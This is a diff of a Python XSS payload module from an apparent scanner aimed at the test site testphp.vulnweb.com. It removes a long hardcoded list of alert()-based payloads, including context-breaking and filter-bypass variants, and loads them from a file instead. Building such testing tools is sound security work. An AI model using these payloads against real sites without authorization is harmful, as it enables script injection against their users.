@@ -2,120 +2,23 @@
 XSS payloads for testing Cross-Site Scripting vulnerabilities
 """
 
+from utils.payload_loader import PayloadLoader
+
 class XSSPayloads:
     """XSS payload collection optimized for testphp.vulnweb.com"""
     
     @staticmethod
     def get_basic_payloads():
-        """Get basic XSS payloads optimized for testphp.vulnweb.com"""
-        return [
-            # testphp.vulnweb.com confirmed working payloads
-            '<IMG sRC=X onerror=jaVaScRipT:alert`xss`>',
-            '<IMG sRC=X onerror=jaVaScRipT:alert`1`>',
-            
-            # Basic script tags
-            '<script>alert(1)</script>',
-            '<script>alert("XSS")</script>',
-            '<script>alert(String.fromCharCode(88,83,83))</script>',
-            
-            # Image-based XSS
-            '<img src=x onerror=alert(1)>',
-            '<img src="x" onerror="alert(1)">',
-            '<img src=x onerror=alert(String.fromCharCode(88,83,83))>',
-            
-            # Context breaking for testphp.vulnweb.com
-            '"><IMG sRC=X onerror=jaVaScRipT:alert`xss`>',
-            "'><IMG sRC=X onerror=jaVaScRipT:alert`xss`>",
-            '%22%3E%3CIMG%20sRC=X%20onerror=jaVaScRipT:alert`xss`%3E',
-            
-            # SVG-based XSS
-            '<svg onload=alert(1)>',
-            '<svg><script>alert(1)</script></svg>',
-            '<svg onload="alert(1)">',
-            
-            # Event handlers
-            '<body onload=alert(1)>',
-            '<input onfocus=alert(1) autofocus>',
-            '<select onfocus=alert(1) autofocus>',
-            '<textarea onfocus=alert(1) autofocus>',
-            '<keygen onfocus=alert(1) autofocus>',
-            '<details open ontoggle=alert(1)>',
-            '<marquee onstart=alert(1)>',
-            
-            # JavaScript URLs
-            'javascript:alert(1)',
-            'javascript:alert("XSS")',
-            'javascript:alert(String.fromCharCode(88,83,83))',
-            
-            # HTML5 elements
-            '<video><source onerror="alert(1)">',
-            '<audio src=x onerror=alert(1)>',
-            '<meter onmouseover=alert(1)>',
-            '<progress onmouseover=alert(1)>',
-            
-            # Iframe-based
-            '<iframe src=javascript:alert(1)>',
-            '<iframe src="javascript:alert(1)">',
-            
-            # Form-based
-            '<form><button formaction=javascript:alert(1)>Click',
-            '<form><input formaction=javascript:alert(1) type=submit value=Click>',
-            
-            # Simple payloads for parameter injection
-            '"><script>alert(1)</script>',
-            "'><script>alert(1)</script>",
-            '</script><script>alert(1)</script>',
-            
-            # Attribute breaking
-            '" onmouseover="alert(1)',
-            "' onmouseover='alert(1)",
-            '> <script>alert(1)</script>',
-            
-            # Case variations
-            '<ScRiPt>alert(1)</ScRiPt>',
-            '<SCRIPT>alert(1)</SCRIPT>',
-            '<script>ALERT(1)</script>',
-            
-            # Parameter-specific payloads for testphp.vulnweb.com
-            'searchFor=<script>alert(1)</script>',
-            'name=<script>alert(1)</script>',
-            'uuname=<script>alert(1)</script>',
-            'cat=<script>alert(1)</script>',
-            'artist=<script>alert(1)</script>',
-            'pp=<script>alert(1)</script>',
-            'p=<script>alert(1)</script>',
-            
-            # Filter bypass techniques
-            '<script>alert(/XSS/)</script>',
-            '<script>alert`1`</script>',
-            '<script>(alert)(1)</script>',
-            '<script>a=alert,a(1)</script>',
-            '<<SCRIPT>alert("XSS");//<</SCRIPT>',
-            
-            # Context-specific for search forms
-            "';alert(1);//",
-            '";alert(1);//',
-            "';alert(1);var a='",
-            '";alert(1);var a="'
-        ]
+        """Get basic XSS payloads from text file"""
+        return PayloadLoader.load_payloads('xss')[:50]  # First 50 payloads
     
     @staticmethod
     def get_advanced_payloads():
-        """Get advanced XSS payloads"""
-        return [
-            '<script>alert(String.fromCharCode(88,83,83))</script>',
-            '<img src="x" onerror="alert(\'XSS\')">',
-            '<svg/onload=alert(/XSS/)>',
-            '<iframe srcdoc="<script>alert(\'XSS\')</script>">',
-            '<object data="javascript:alert(\'XSS\')">',
-            '<embed src="javascript:alert(\'XSS\')">',
-            '<form><button formaction="javascript:alert(\'XSS\')">',
-            '<input type="image" src="x" onerror="alert(\'XSS\')">',
-            '<video><source onerror="alert(\'XSS\')">',
-            '<audio src="x" onerror="alert(\'XSS\')">'
-        ]
+        """Get advanced XSS payloads from text file"""
+        all_payloads = PayloadLoader.load_payloads('xss')
+        return all_payloads[50:] if len(all_payloads) > 50 else []
     
     @staticmethod
     def get_all_payloads():
-        """Get all XSS payloads"""
-        return XSSPayloads.get_basic_payloads() + XSSPayloads.get_advanced_payloads()
+        """Get all XSS payloads from text file"""
+        return PayloadLoader.load_payloads('xss')
